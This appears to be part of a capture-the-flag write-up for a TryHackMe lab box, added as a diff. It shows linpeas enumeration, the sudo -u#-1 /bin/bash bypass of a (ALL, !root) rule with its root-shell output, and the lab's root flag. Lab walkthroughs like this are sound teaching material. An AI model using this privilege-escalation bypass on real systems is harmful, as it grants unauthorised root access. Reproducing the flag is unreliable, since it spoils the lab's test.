@@ -434,3 +434,45 @@ Now this command will help us that as a current user can i set executable permis
 when i test this for the linpeas file 
 
 It said yes i could execute linpeas file so i put the linpeas in the tareget machine and run it on target machine.
+
+The result gave multiple CVEs but none of them was the correct answer
+
+I moved forward with checking sudo privileges for james
+
+```
+james@agent-sudo:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+```
+
+If james does sudo /bin/bash, it will prevent escalation to UID 0 since !root is specified but what if we use a numeric ID instead of the root word
+
+```
+james@agent-sudo:~$ sudo -u#-1 /bin/bash
+root@agent-sudo:~# 
+root@agent-sudo:~# id
+uid=0(root) gid=1000(james) groups=1000(james)
+```
+
+So after this i go this context at the location /root/root.txt
+
+```
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+
+```
+Issuing a sudo -l command shows that the current user could run (ALL, !root) /bin/bash command on the machine.
+
+Searching Google for this particular command gives the CVE number of this vulnerability.
+
